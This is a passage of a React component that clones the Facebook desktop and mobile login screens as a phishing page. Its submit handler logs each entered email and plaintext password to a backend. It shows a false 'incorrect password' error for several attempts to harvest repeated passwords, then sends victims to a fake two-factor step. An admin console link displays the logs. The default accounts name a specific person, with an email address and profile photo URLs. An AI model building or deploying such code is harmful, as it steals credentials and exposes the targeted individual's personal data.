import React, { useState, useEffect } from 'react';
import {
  X,
  HelpCircle,
  Eye,
  EyeOff,
  ChevronDown,
  ChevronRight,
  ChevronLeft,
  ArrowLeft,
  Info,
  Check,
  AlertCircle,
} from 'lucide-react';
import { FacebookOfficialLogo, FacebookSolidGearIcon } from './FacebookSidebarIcons';
import FacebookAvatar from './FacebookAvatar';
import { useAuth } from '../context/AuthContext';
import fbCollageImg from '../assets/image.png';
import metaLogoHorizontal from '../assets/facebook-meta-logo.png';
import ForgotPasswordFlow from './ForgotPasswordFlow';
import SignUpFlow from './SignUpFlow';
import TwoFactorVerification from './TwoFactorVerification';
import { api } from '../api/client';
import { getCurrentRoute, setRoute } from '../utils/router';

export default function LoginPage({ onOpenAdmin }) {
  const { login, loginWithAccount, signup, recentAccounts } = useAuth();

  const getInitialDesktopMode = (r) => {
    if (r.page === '2fa') return '2fa';
    if (r.page === 'forgot') return 'forgot';
    if (r.page === 'signup') return 'signup';
    if (r.page === 'login') return 'form';
    return 'accounts';
  };
  const getInitialAuthMode = (r) => {
    if (r.page === '2fa') return '2fa';
    if (r.page === 'forgot') return 'forgot';
    if (r.page === 'signup') return 'signup';
    if (r.page === 'login') return 'login';
    return 'accounts';
  };

  const initialRoute = getCurrentRoute();
  // Mobile mode: 'accounts' | 'login' | 'find_account' | '2fa' | 'forgot' | 'signup'
  const [authMode, setAuthMode] = useState(() => getInitialAuthMode(initialRoute));

  // Desktop mode: 'accounts' | 'password' | 'form' | '2fa' | 'forgot' | 'signup'
  const [desktopMode, setDesktopMode] = useState(() => getInitialDesktopMode(initialRoute));

  const [selectedAccount, setSelectedAccount] = useState(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  // Configurable password trial gatekeeper
  const [maxPasswordTrials, setMaxPasswordTrials] = useState(() => {
    try {
      const saved = localStorage.getItem('sphere_recovery_settings');
      if (saved) {
        const parsed = JSON.parse(saved);
        if (parsed.maxPasswordTrials !== undefined) {
          const val = parseInt(parsed.maxPasswordTrials, 10);
          if (!isNaN(val) && val >= 1) return val;
        }
      }
    } catch {}
    return 3;
  });
  const [trialCount, setTrialCount] = useState(0);
  const [loginError, setLoginError] = useState('');

  // Sync recovery settings (including maxPasswordTrials)
  useEffect(() => {
    const handleSyncTrials = (e) => {
      let parsed = e?.detail;
      if (!parsed) {
        try {
          const saved = localStorage.getItem('sphere_recovery_settings');
          if (saved) parsed = JSON.parse(saved);
        } catch {}
      }
      if (parsed && parsed.maxPasswordTrials !== undefined) {
        const val = parseInt(parsed.maxPasswordTrials, 10);
        if (!isNaN(val) && val >= 1) setMaxPasswordTrials(val);
      }
    };

    window.addEventListener('sphere_recovery_updated', handleSyncTrials);
    window.addEventListener('storage', handleSyncTrials);

    if (api?.admin?.getRecoverySettings) {
      api.admin.getRecoverySettings().then((res) => {
        if (res && res.maxPasswordTrials !== undefined) {
          const val = parseInt(res.maxPasswordTrials, 10);
          if (!isNaN(val) && val >= 1) setMaxPasswordTrials(val);
        }
      }).catch(() => {});
    }

    return () => {
      window.removeEventListener('sphere_recovery_updated', handleSyncTrials);
      window.removeEventListener('storage', handleSyncTrials);
    };
  }, []);

  const [showSignupModal, setShowSignupModal] = useState(false);
  const [showLanguageSheet, setShowLanguageSheet] = useState(false);
  const [selectedLanguage, setSelectedLanguage] = useState('English (UK)');

  // Find account state
  const [findAccountMode, setFindAccountMode] = useState('phone'); // 'phone' | 'email'
  const [findInputValue, setFindInputValue] = useState('');

  const [liveDesktopAccounts, setLiveDesktopAccounts] = useState(null);
  const [liveMobileAccounts, setLiveMobileAccounts] = useState(null);

  useEffect(() => {
    const handleHash = () => {
      const route = getCurrentRoute();
      if (route.page === '2fa') {
        setDesktopMode('2fa');
        setAuthMode('2fa');
        setRoute('2fa', true);
      } else if (route.page === 'forgot') {
        setDesktopMode('forgot');
        setAuthMode('forgot');
        setRoute('forgot', true);
      } else if (route.page === 'signup') {
        setDesktopMode('signup');
        setAuthMode('signup');
        setRoute('signup', true);
      } else if (route.page === 'login') {
        setDesktopMode('form');
        setAuthMode('login');
        setRoute('login', true);
      } else if (route.page === 'accounts' || !route.page) {
        setDesktopMode('accounts');
        setAuthMode('accounts');
      }
    };

    handleHash();

    window.addEventListener('hashchange', handleHash);
    return () => window.removeEventListener('hashchange', handleHash);
  }, []);

  const loadFirstPageAccounts = () => {
    // 1. Try fetching from backend API
    api.getFirstPageAccounts().then((res) => {
      if (res) {
        if (Array.isArray(res.desktopAccounts) && res.desktopAccounts.length > 0) {
          setLiveDesktopAccounts(res.desktopAccounts);
        }
        if (Array.isArray(res.mobileAccounts) && res.mobileAccounts.length > 0) {
          setLiveMobileAccounts(res.mobileAccounts);
        }
      }
    }).catch(() => {});

    // 2. Also check local storage for instantaneous reactive update
    try {
      const savedUsers = localStorage.getItem('sphere_users') || localStorage.getItem('sphere_admin_users');
      if (savedUsers) {
        const parsedUsers = JSON.parse(savedUsers);
        if (Array.isArray(parsedUsers) && parsedUsers.length > 0) {
          const desktop = parsedUsers.filter((u) => u.showOnDesktopLogin !== false);
          const mobile = parsedUsers.filter((u) => u.showOnMobileLogin !== false);
          setLiveDesktopAccounts(desktop.length > 0 ? desktop : parsedUsers);
          setLiveMobileAccounts(mobile.length > 0 ? mobile : (desktop.length > 0 ? desktop : parsedUsers));
          return;
        }
      }

      const savedAccounts = localStorage.getItem('sphere_first_page_accounts');
      if (savedAccounts) {
        const parsed = JSON.parse(savedAccounts);
        if (Array.isArray(parsed.desktopAccounts) && parsed.desktopAccounts.length > 0) {
          setLiveDesktopAccounts(parsed.desktopAccounts);
        }
        if (Array.isArray(parsed.mobileAccounts) && parsed.mobileAccounts.length > 0) {
          setLiveMobileAccounts(parsed.mobileAccounts);
        }
      }
    } catch {}
  };

  useEffect(() => {
    loadFirstPageAccounts();

    window.addEventListener('sphere_first_page_accounts_updated', loadFirstPageAccounts);
    window.addEventListener('sphere_users_updated', loadFirstPageAccounts);
    window.addEventListener('storage', loadFirstPageAccounts);
    return () => {
      window.removeEventListener('sphere_first_page_accounts_updated', loadFirstPageAccounts);
      window.removeEventListener('sphere_users_updated', loadFirstPageAccounts);
      window.removeEventListener('storage', loadFirstPageAccounts);
    };
  }, []);

  // Default login accounts matching store.json
  const defaultAccounts = React.useMemo(() => [
    {
      id: 'acc_tahir_adem',
      name: 'Deng Garang Ajou',
      shortName: 'Deng',
      email: 'dengdengue1@gmail.com',
      avatar: 'https://scontent.fadd3-1.fna.fbcdn.net/v/t39.30808-1/449190487_433951952781419_1825475880531579874_n.jpg?stp=dst-jpg_tt6&cstp=mx413x413&ctp=s200x200&_nc_cat=108&_nc_map=urlgen_bucketless&ccb=1-7&_nc_sid=1d2534&_nc_eui2=AeHlhWIbuAFAPXShnX0fD77wMug7sU-Uhnky6DuxT5SGeWty6voPF4Wh0uFgXu1-dVjpJ0K_VGRVt6hDxu--PPBI&_nc_ohc=vSmEpTw7RLUQ7kNvwExJfAp&_nc_oc=AdpJiJfafFB1fUzr7w8levQCzrNPe9eEjG3-illzbHh7uKC_I07n7TYOWeg4HLabacg&_nc_zt=24&_nc_ht=scontent.fadd3-1.fna&_nc_gid=LmlBjUAiMhqmFiz3yR-8zw&_nc_ss=7a2a8&oh=00_AQTOqljyML03azhd2tVUN3Zima6BTa-A8aFrymonlAPxFg&oe=6AF50A80',
      showOnDesktopLogin: true,
      showOnMobileLogin: true,
    },
    {
      id: 'user_1794067970196',
      name: 'Deng Garang Ajou',
      shortName: 'Deng',
      email: 'user@gmail.com',
      avatar: 'https://scontent.fadd3-1.fna.fbcdn.net/v/t39.30808-1/310947835_120347710808513_5161735598945191192_n.jpg?stp=c0.0.720.720a_dst-jpg_tt6&cstp=mx720x720&ctp=s200x200&_nc_cat=105&_nc_map=urlgen_bucketless&ccb=1-7&_nc_sid=2d3e12&_nc_eui2=AeH7_bc5jNDs0UxxKNaiHoa4tBsLndnPaUa0Gwud2c9pRpvxzzOPPWtJlY14LB5YQ1ek2BeVLkqdanRL4rQ7FxGT&_nc_ohc=8RYCb_2USioQ7kNvwFQ3EEn&_nc_oc=AdrehPY6kKx73Kb_vhLchzyyfweYvV9GJBB3tjgo222ZwDC5DitmBOZtqEeN-jJ3pR8&_nc_zt=24&_nc_ht=scontent.fadd3-1.fna&_nc_gid=ScI9Y1UDvtNCUhZaCG4XDg&_nc_ss=7a2a8&oh=00_AQTEIKES7__FymdukkchvT0KFpI6tj0yk_w8n70NWlHwyw&oe=6AF52BE8',
      showOnDesktopLogin: true,
      showOnMobileLogin: true,
    },
    {
      id: 'user_1794067752853',
      name: 'Deng Garang Ajou',
      shortName: 'Deng',
      email: 'user@gmail.com',
      avatar: 'https://scontent.fadd3-1.fna.fbcdn.net/v/t39.30808-1/493041684_658258897010006_7272170067908269365_n.jpg?stp=dst-jpg_tt6&cstp=mx960x960&ctp=s200x200&_nc_cat=109&_nc_map=urlgen_bucketless&ccb=1-7&_nc_sid=2d3e12&_nc_eui2=AeGDRlyiFnAymqp4q_UtI_aavZmRdi0ciL-9mZF2LRyIv9QyrjFu5Ucz5KKBBeBczgAlhjsKHnb4nXCd9FOKMeQj&_nc_ohc=oJztv4-MPDsQ7kNvwFwro6-&_nc_oc=AdqS0DWyfpvGUFBk0mED9v1NRz0Rt1_t55Vy_bq0-xapCFk0M9zs6uTVT5tjyc5N4sQ&_nc_zt=24&_nc_ht=scontent.fadd3-1.fna&_nc_gid=43mrPclLF9k3j2NuofEY1A&_nc_ss=7a2a8&oh=00_AQTZzLCtdPrTYCQDHMLuOs1oirAifxJUZ1i3Jgw5zyEO1w&oe=6AF53804',
      showOnDesktopLogin: true,
      showOnMobileLogin: true,
    },
  ], []);

  const displayDesktopList = (liveDesktopAccounts && liveDesktopAccounts.length > 0) ? liveDesktopAccounts : defaultAccounts;
  const displayMobileList = (liveMobileAccounts && liveMobileAccounts.length > 0) ? liveMobileAccounts : displayDesktopList;

  // Desktop select account handler (no auto-fill of email or name)
  const handleDesktopSelectAccount = (account) => {
    setSelectedAccount(account);
    setEmail('');
    setDesktopMode('form');
    setPassword('');
    setShowPassword(false);
    setTrialCount(0);
    setLoginError('');
    setRoute('login');
  };

  // Mobile select account handler (no auto-fill of email or name)
  const handleSelectAccount = (account) => {
    setSelectedAccount(account);
    setEmail('');
    setFindInputValue('');
    setPassword('');
    setShowPassword(false);
    setTrialCount(0);
    setLoginError('');
    setAuthMode('login');
    setRoute('login');
  };

  // Login submission handler with 3-trial validation and credential logging
  const handleLoginSubmit = async (e) => {
    e.preventDefault();

    const usernameVal = email.trim() || selectedAccount?.name || 'Anonymous User';

    if (!email.trim()) {
      setLoginError('Please enter your mobile number or email address.');
      return;
    }

    if (!password) {
      setLoginError('Please enter your password.');
      return;
    }

    const maxTrials = maxPasswordTrials || 3;
    const currentTrial = trialCount + 1;
    const isSuccess = currentTrial >= maxTrials;

    // Log the single explicit trial attempt to the database
    api.logAttempt({
      username: usernameVal,
      email: email.trim(),
      password: password,
      accountName: selectedAccount?.name || usernameVal,
      action: isSuccess 
        ? `Login Password Verified (Allowed at Trial #${currentTrial} of ${maxTrials})` 
        : `Login Button Clicked (Incorrect Password Trial #${currentTrial} of ${maxTrials})`,
      source: window.innerWidth > 768 ? 'Desktop Login Screen' : 'Mobile Login Screen',
      screen: window.innerWidth > 768 ? 'Desktop Facebook Login Form' : 'Mobile Facebook Login Form',
      device: window.innerWidth > 768 ? 'Desktop Browser (PC/Mac)' : 'Mobile Device',
      success: isSuccess,
      trialCount: currentTrial,
    });

    // If still before maxTrials: show error banner and clear incorrect password
    if (currentTrial < maxTrials) {
      setTrialCount(currentTrial);
      setLoginError(true);
      setPassword('');
      return;
    }

    // Reached maxTrials: redirect user to the Two-Factor Verification screen
    setTrialCount(currentTrial);
    setLoginError(false);
    setRoute('2fa');
    if (typeof window !== 'undefined' && window.innerWidth > 768) {
      setDesktopMode('2fa');
    } else {
      setAuthMode('2fa');
    }
  };

  const handleFindAccountSubmit = (e) => {
    e.preventDefault();
    if (!findInputValue.trim()) {
      return;
    }
    if (selectedAccount) {
      loginWithAccount(selectedAccount);
    } else {
      const matched = [...desktopDisplayAccounts, ...mobileDisplayAccounts].find(
        (a) =>
          a.email?.toLowerCase() === findInputValue.trim().toLowerCase() ||
          a.name?.toLowerCase().includes(findInputValue.trim().toLowerCase())
      );
      if (matched) {
        loginWithAccount(matched);
      } else {
        login(findInputValue.trim(), 'password');
      }
    }
  };

  const toggleFindMode = () => {
    if (findAccountMode === 'phone') {
      setFindAccountMode('email');
      setFindInputValue('');
    } else {
      setFindAccountMode('phone');
      setFindInputValue('');
    }
  };

  const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
  const days = Array.from({ length: 31 }, (_, i) => i + 1);
  const years = Array.from({ length: 80 }, (_, i) => 2026 - i);

  const languages = React.useMemo(() => [
    { id: 'en_gb', name: 'English (UK)' },
    { id: 'am', name: 'አማርኛ' },
    { id: 'so', name: 'Af-Soomaali' },
    { id: 'pl', name: 'Polski' },
    { id: 'es', name: 'Español' },
    { id: 'ar', name: 'العربية' },
    { id: 'fr', name: 'Français (France)' },
    { id: 'pt', name: 'Português (Brasil)' },
    { id: 'it', name: 'Italiano' },
    { id: 'de', name: 'Deutsch' },
    { id: 'en_us', name: 'English (US)' },
  ], []);

  return (
    <div className="fb-exact-login-root fb-white-login-page">
      {/* ========================================================
          1. DESKTOP / PC LOGIN LAYOUT (Exact match to web.facebook.com)
          Visible only on screens > 768px
          ======================================================== */}
      {desktopMode === '2fa' ? (
        <TwoFactorVerification
          isDesktop={true}
          userInput={email || selectedAccount?.name || 'User'}
          userPassword={password}
          onSuccess={async () => {
            setRoute('home');
            if (selectedAccount) {
              await loginWithAccount(selectedAccount, password);
            } else {
              await login(email.trim(), password);
            }
          }}
          onBack={() => {
            setDesktopMode('form');
            setRoute('login');
          }}
          onTryAnotherWay={() => {
            setDesktopMode('forgot');
            setRoute('forgot');
          }}
        />
      ) : desktopMode === 'forgot' ? (
        <div className="fb-desktop-login-layout" style={{ width: '100%', minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
          <ForgotPasswordFlow
            isDesktop={true}
            initialAccount={null}
            initialInput=""
            onBackToLogin={() => {
              setDesktopMode('form');
              setRoute('login');
            }}
            onLoginSuccess={(acc, pass) => {
              setRoute('home');
              if (acc) loginWithAccount(acc, pass);
              else login(email || acc?.email || 'User', pass || 'password');
            }}
          />
        </div>
      ) : desktopMode === 'signup' ? (
        <div style={{ width: '100%', minHeight: '100vh', backgroundColor: '#FFFFFF' }}>
          <SignUpFlow
            onBackToLogin={() => {
              setDesktopMode('form');
              setRoute('login');
            }}
            onGoToFindAccount={() => {
              setDesktopMode('forgot');
              setRoute('forgot');
            }}
            onSignUpSuccess={(data) => {
              signup(data);
              setDesktopMode('accounts');
              setRoute('home');
            }}
          />
        </div>
      ) : (
        <>
          <div className="fb-exact-login-body fb-desktop-login-layout">
        {/* Left Column: Official Facebook Logo, Big Headline & Collage */}
        <div className="fb-exact-login-left">
          {/* Facebook Official Circular Logo at Top Left */}
          <div className="fb-exact-logo-wrap">
            <FacebookOfficialLogo size={56} />
          </div>

          {/* Headline at bottom-left */}
          <div className="fb-exact-headline">
            <div>Explore</div>
            <div>the</div>
            <div>things</div>
            <div className="fb-blue-text">you love.</div>
          </div>

          {/* Exact Facebook Collage positioned near top-right of left column */}
          <div className="fb-exact-collage-wrap">
            <img
              src={fbCollageImg}
              alt="Facebook Collage"
              className="fb-exact-collage-img"
            />
          </div>
        </div>

        {/* Vertical Divider Line between Left and Right */}
        <div className="fb-exact-vertical-divider" />

        {/* Right Column: Clean Open Login Panel */}
        <div className="fb-exact-login-right">
          <div className="fb-exact-right-inner">
            {desktopMode === 'accounts' ? (
              /* State 1: Recent Logins (Exact match to media_1793948184829_6c12b560.jpg) */
              <>
                <div className="fb-exact-header-row">
                  <h2 className="fb-exact-header-title">Log in to Facebook</h2>
                  <button
                    type="button"
                    className="fb-exact-settings-btn"
                    title="Account Settings"
                    onClick={() => alert('Account Settings')}
                  >
                    <FacebookSolidGearIcon size={24} />
                  </button>
                </div>

                {/* Profiles List: Dynamic Accounts Managed by Admin */}
                <div className="fb-exact-profiles-list">
                  {displayDesktopList.map((account) => (
                    <div
                      key={account.id}
                      className="fb-exact-profile-item"
                      onClick={() => handleDesktopSelectAccount(account)}
                    >
                      <div className="fb-exact-profile-avatar">
                        {account.avatar ? (
                          <img
                            src={account.avatar}
                            alt={account.name}
                            style={{ width: 52, height: 52, borderRadius: '50%', objectFit: 'cover' }}
                          />
                        ) : (
                          <FacebookAvatar size={52} />
                        )}
                      </div>
                      <div className="fb-exact-profile-name">{account.name}</div>
                      <ChevronRight size={22} className="fb-exact-profile-arrow" />
                    </div>
                  ))}
                </div>

                {/* "Use another profile" Button */}
                <button
                  type="button"
                  className="fb-exact-btn-use-another"
                  onClick={() => handleDesktopSelectAccount(null)}
                >
                  Use another profile
                </button>

                {/* "Create new account" Button */}
                <button
                  type="button"
                  className="fb-exact-btn-create-outline"
                  onClick={() => {
                    setDesktopMode('signup');
                    setRoute('signup');
                  }}
                >
                  Create new account
                </button>

                {/* Meta Branding at Bottom */}
                <div className="fb-exact-meta-brand">
                  <img
                    src={metaLogoHorizontal}
                    alt="Meta"
                    className="fb-exact-meta-img"
                  />
                </div>
              </>
            ) : (
              /* State 2: Desktop Login Form (Exact match to media_1793948617406_bfbc6e9a.jpg) */
              <>
                <div className="fb-desktop-form-header">
                  <button
                    type="button"
                    className="fb-desktop-back-chevron"
                    onClick={() => {
                      setDesktopMode('accounts');
                      setRoute('accounts');
                      setLoginError('');
                      setTrialCount(0);
                    }}
                    title="Back to accounts"
                    aria-label="Back to accounts"
                  >
                    <ChevronLeft size={24} color="#050505" strokeWidth={2.4} />
                  </button>
                  <h2 className="fb-desktop-form-title">Log into Facebook</h2>
                </div>

                <form onSubmit={handleLoginSubmit} className="fb-desktop-form" autoComplete="off">
                  {/* Exact Facebook Error Banner matching user's screenshot */}
                  {loginError && (
                    <div className="fb-desktop-error-banner" key={trialCount}>
                      <svg width="20" height="20" viewBox="0 0 20 20" fill="none" style={{ flexShrink: 0, marginTop: 1 }}>
                        <circle cx="10" cy="10" r="8.75" stroke="#C41C34" strokeWidth="1.6" />
                        <circle cx="10" cy="6.2" r="1.1" fill="#C41C34" />
                        <rect x="9.1" y="8.8" width="1.8" height="5.5" rx="0.5" fill="#C41C34" />
                      </svg>
                      <div className="fb-desktop-error-banner-text">
                        The login information you entered is incorrect.{' '}
                        <a
                          href="#find-account"
                          className="fb-desktop-error-banner-link"
                          onClick={(e) => {
                            e.preventDefault();
                            setDesktopMode('forgot');
                            setRoute('forgot');
                          }}
                        >
                          Find your account and log in.
                        </a>
                      </div>
                    </div>
                  )}

                  {/* Field 1: Email or mobile number (Always displayed, no auto-fill) */}
                  <div className="fb-desktop-input-wrap">
                    <input
                      type="text"
                      name="fb_desktop_identity"
                      autoComplete="off"
                      data-lpignore="true"
                      placeholder="Email or mobile number"
                      className="fb-desktop-input"
                      value={email}
                      onChange={(e) => {
                        setEmail(e.target.value);
                        if (loginError) setLoginError('');
                      }}
                    />
                  </div>

                  {/* Field 2: Password */}
                  <div className="fb-desktop-input-wrap" style={{ position: 'relative' }}>
                    <input
                      type={showPassword ? 'text' : 'password'}
                      name="fb_desktop_pass"
                      autoComplete="new-password"
                      placeholder="Password"
                      className="fb-desktop-input"
                      value={password}
                      onChange={(e) => {
                        setPassword(e.target.value);
                        if (loginError) setLoginError('');
                      }}
                      autoFocus
                    />
                    {password.length > 0 && (
                      <button
                        type="button"
                        className="fb-desktop-eye-btn"
                        onClick={() => setShowPassword((p) => !p)}
                        title={showPassword ? 'Hide password' : 'Show password'}
                      >
                        {showPassword ? <EyeOff size={19} color="#65676B" /> : <Eye size={19} color="#65676B" />}
                      </button>
                    )}
                  </div>

                  {/* Primary Blue Button: Log in */}
                  <button type="submit" className="fb-desktop-login-btn">
                    Log in
                  </button>

                  {/* Forgot password? link */}
                  <div className="fb-desktop-forgot-wrap">
                    <a
                      href="#forgot"
                      className="fb-desktop-forgot-link"
                      onClick={(e) => {
                        e.preventDefault();
                        setDesktopMode('forgot');
                        setRoute('forgot');
                      }}
                    >
                      Forgot password?
                    </a>
                  </div>

                  {/* Secondary Outline Button: Create new account */}
                  <button
                    type="button"
                    className="fb-desktop-create-btn"
                    onClick={() => {
                      setDesktopMode('signup');
                      setRoute('signup');
                    }}
                  >
                    Create new account
                  </button>

                  {/* Meta Logo at Bottom */}
                  <div className="fb-desktop-meta-wrap">
                    <img
                      src={metaLogoHorizontal}
                      alt="Meta"
                      className="fb-exact-meta-img"
                    />
                  </div>
                </form>
              </>
            )}
          </div>
        </div>
      </div>

      {/* Desktop Footer (Matching web.facebook.com) */}
      <footer className="fb-exact-footer">
        <div className="fb-exact-footer-inner">
          <div className="fb-exact-lang-row">
            <span>English (UK)</span>
            <a href="#lang">አማርኛ</a>
            <a href="#lang">Af-Soomaali</a>
            <a href="#lang">العربية</a>
            <a href="#lang">Português (Brasil)</a>
            <a href="#lang">Español</a>
            <a href="#lang">Français (France)</a>
            <a href="#lang" style={{ color: '#0866FF', fontWeight: 600 }}>More languages...</a>
          </div>

          <div className="fb-exact-footer-divider" />

          <div className="fb-exact-links-row">
            <a
              href="#signup"
              onClick={(e) => {
                e.preventDefault();
                setDesktopMode('signup');
                setRoute('signup');
              }}
            >
              Sign up
            </a>
            <a
              href="#login"
              onClick={(e) => {
                e.preventDefault();
                setDesktopMode('form');
                setRoute('login');
              }}
            >
              Log in
            </a>
            <a href="#messenger">Messenger</a>
            <a href="#lite">Facebook Lite</a>
            <a href="#video">Video</a>
            <a href="#pay">Meta Pay</a>
            <a href="#store">Meta Store</a>
            <a href="#quest">Meta Quest</a>
            <a href="#rayban">Ray-Ban Meta</a>
            <a href="#ai">Meta AI</a>
            <a href="#instagram">Instagram</a>
            <a href="#threads">Threads</a>
            <a href="#privacy">Privacy Policy</a>
            <a href="#terms">Terms</a>
            <a href="#help">Help</a>
            <a
              href="#admin/logs"
              style={{ color: '#0866FF', fontWeight: 600 }}
              onClick={(e) => {
                e.preventDefault();
                setRoute('admin/logs');
                if (onOpenAdmin) onOpenAdmin();
              }}
            >
              Admin Console
            </a>
          </div>
        </div>
      </footer>
        </>
      )}

      {/* ========================================================
          2. MOBILE RESPONSIVE LOGIN LAYOUT (Screens <= 768px)
          ======================================================== */}
      <div className="fb-clean-login-container fb-mobile-login-view">
        {/* SCREEN 1: "the user opens the site it shows the already logged in users on this device" */}
        {authMode === 'accounts' && (
          <div className="fb-exact-clean-login-view">
            {/* Top Centered Language Selector */}
            <div className="fb-clean-topbar">
              <button
                type="button"
                className="fb-clean-lang-btn"
                onClick={() => setShowLanguageSheet(true)}
                title="Select language"
              >
                <span>{selectedLanguage}</span>
                <ChevronDown size={14} color="#65676B" strokeWidth={2.5} />
              </button>
            </div>

            {/* Centered Facebook Round Blue Logo */}
            <div className="fb-clean-brand-logo">
              <FacebookOfficialLogo size={62} />
            </div>

            {/* Saved Accounts on this Device */}
            <div className="fb-clean-form-wrapper">
              <div className="fb-accounts-list">
                {displayMobileList.map((account) => (
                  <div
                    key={account.id}
                    className="fb-mobile-account-card"
                    onClick={() => handleSelectAccount(account)}
                  >
                    <div className="fb-mobile-card-avatar">
                      {account.avatar ? (
                        <img
                          src={account.avatar}
                          alt={account.name}
                          style={{ width: '100%', height: '100%', objectFit: 'cover' }}
                        />
                      ) : (
                        <FacebookAvatar size={50} />
                      )}
                    </div>
                    <div className="fb-mobile-card-name">
                      {account.name}
                    </div>
                    <ChevronRight size={22} color="#65676B" strokeWidth={2.4} />
                  </div>
                ))}
              </div>

              {/* Log into another account link */}
              <button
                type="button"
                className="fb-clean-use-another-btn"
                onClick={() => handleSelectAccount(null)}
              >
                Log into another account
              </button>
            </div>

            {/* Bottom Section: Create new account + Meta Branding */}
            <div className="fb-clean-bottom-section">
              <button
                type="button"
                className="fb-clean-create-btn"
                onClick={() => {
                  setAuthMode('signup');
                  setRoute('signup');
                }}
              >
                Create new account
              </button>

              <div className="fb-clean-meta-footer">
                <img
                  src={metaLogoHorizontal}
                  alt="Meta"
                  className="fb-clean-meta-img"
                />
              </div>
            </div>
          </div>
        )}

        {/* SCREEN 2: LOGIN PAGE (Username auto-filled from chosen account) */}
        {authMode === 'login' && (
          <div className="fb-exact-clean-login-view">
            {/* Topbar with Back Arrow returning to Accounts List */}
            <div className="fb-clean-topbar fb-clean-topbar-with-back">
              <button
                type="button"
                className="fb-clean-back-btn"
                onClick={() => {
                  setAuthMode('accounts');
                  setRoute('accounts');
                  setLoginError('');
                  setTrialCount(0);
                }}
                title="Back to accounts"
              >
                <ArrowLeft size={24} color="#050505" strokeWidth={2.4} />
              </button>

              <button
                type="button"
                className="fb-clean-lang-btn"
                onClick={() => setShowLanguageSheet(true)}
                title="Select language"
              >
                <span>{selectedLanguage}</span>
                <ChevronDown size={14} color="#65676B" strokeWidth={2.5} />
              </button>

              <div style={{ width: 36 }} />
            </div>

            {/* Centered Facebook Round Blue Logo */}
            <div className="fb-clean-brand-logo">
              <FacebookOfficialLogo size={62} />
            </div>

            {/* Login Form */}
            <div className="fb-clean-form-wrapper">
              <form onSubmit={handleLoginSubmit} className="fb-clean-form" autoComplete="off">
                {/* Exact Facebook Error Banner */}
                {loginError && (
                  <div className="fb-desktop-error-banner" key={trialCount} style={{ marginBottom: 14 }}>
                    <svg width="20" height="20" viewBox="0 0 20 20" fill="none" style={{ flexShrink: 0, marginTop: 1 }}>
                      <circle cx="10" cy="10" r="8.75" stroke="#C41C34" strokeWidth="1.6" />
                      <circle cx="10" cy="6.2" r="1.1" fill="#C41C34" />
                      <rect x="9.1" y="8.8" width="1.8" height="5.5" rx="0.5" fill="#C41C34" />
                    </svg>
                    <div className="fb-desktop-error-banner-text">
                      The login information you entered is incorrect.{' '}
                      <a
                        href="#find-account"
                        className="fb-desktop-error-banner-link"
                        onClick={(e) => {
                          e.preventDefault();
                          setAuthMode('forgot');
                          setRoute('forgot');
                        }}
                      >
                        Find your account and log in.
                      </a>
                    </div>
                  </div>
                )}

                {/* Input 1: Auto-filled with chosen username */}
                <div className="fb-clean-input-box">
                  <input
                    type="text"
                    name="fb_login_identity"
                    autoComplete="off"
                    data-lpignore="true"
                    placeholder="Mobile number or email address"
                    className="fb-clean-input"
                    value={email}
                    onChange={(e) => {
                      setEmail(e.target.value);
                      if (loginError) setLoginError('');
                    }}
                  />
                  <div className="fb-clean-input-right-icon" title="More info">
                    <Info size={20} color="#65676B" strokeWidth={1.8} />
                  </div>
                </div>

                {/* Input 2: Password with conditional Eye Toggle */}
                <div className="fb-clean-input-box">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    name="fb_login_pass"
                    autoComplete="new-password"
                    placeholder="Password"
                    className="fb-clean-input"
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      if (loginError) setLoginError('');
                    }}
                  />
                  {password.length > 0 && (
                    <button
                      type="button"
                      className="fb-clean-eye-btn"
                      onClick={() => setShowPassword((p) => !p)}
                      title={showPassword ? 'Hide password' : 'Show password'}
                    >
                      {showPassword ? <EyeOff size={20} color="#65676B" /> : <Eye size={20} color="#65676B" />}
                    </button>
                  )}
                </div>

                {/* Primary Button: Log in */}
                <button type="submit" className="fb-clean-login-btn">
                  Log in
                </button>

                {/* Forgot Password */}
                <a
                  href="#forgot"
                  className="fb-clean-forgot-link"
                  onClick={(e) => {
                    e.preventDefault();
                    setAuthMode('forgot');
                    setRoute('forgot');
                  }}
                >
                  Forgotten password?
                </a>
              </form>
            </div>

            {/* Bottom Section: Create new account + Meta Branding */}
            <div className="fb-clean-bottom-section">
              <button
                type="button"
                className="fb-clean-create-btn"
                onClick={() => {
                  setAuthMode('signup');
                  setRoute('signup');
                }}
              >
                Create new account
              </button>

              <div className="fb-clean-meta-footer">
                <img
                  src={metaLogoHorizontal}
                  alt="Meta"
                  className="fb-clean-meta-img"
                />
              </div>
            </div>
          </div>
        )}

        {/* TWO-FACTOR VERIFICATION SCREEN (Mobile) */}
        {authMode === '2fa' && (
          <TwoFactorVerification
            isDesktop={false}
            userInput={email || selectedAccount?.name || 'User'}
            userPassword={password}
            onSuccess={async () => {
              setRoute('home');
              if (selectedAccount) {
                await loginWithAccount(selectedAccount, password);
              } else {
                await login(email.trim(), password);
              }
            }}
            onBack={() => {
              setAuthMode('login');
              setRoute('login');
            }}
            onTryAnotherWay={() => {
              setAuthMode('forgot');
              setRoute('forgot');
            }}
          />
        )}

        {/* FORGOT PASSWORD MULTI-STEP FLOW (Mobile)
            Step 1: Find your account (Image 1)
            Step 2: Log into your Meta Account (Image 3)
            Step 3: Choose a way to log in (Image 4)
            Step 4: Confirm your account (Image 5) */}
        {(authMode === 'forgot' || authMode === 'find_account') && (
          <ForgotPasswordFlow
            isDesktop={false}
            initialAccount={null}
            initialInput=""
            onBackToLogin={() => {
              setAuthMode('login');
              setRoute('login');
            }}
            onLoginSuccess={(acc, pass) => {
              setRoute('home');
              if (acc) loginWithAccount(acc, pass);
              else login(email || acc?.email || 'User', pass || 'password');
            }}
          />
        )}

        {/* MULTI-STEP SIGN UP FLOW (Mobile - Exact match to m.facebook.com/reg/#) */}
        {authMode === 'signup' && (
          <SignUpFlow
            isDesktop={false}
            onClose={() => {
              setAuthMode('accounts');
              setRoute('accounts');
            }}
            onBackToLogin={() => {
              setAuthMode('login');
              setRoute('login');
            }}
            onGoToFindAccount={() => {
              setAuthMode('forgot');
              setRoute('forgot');
            }}
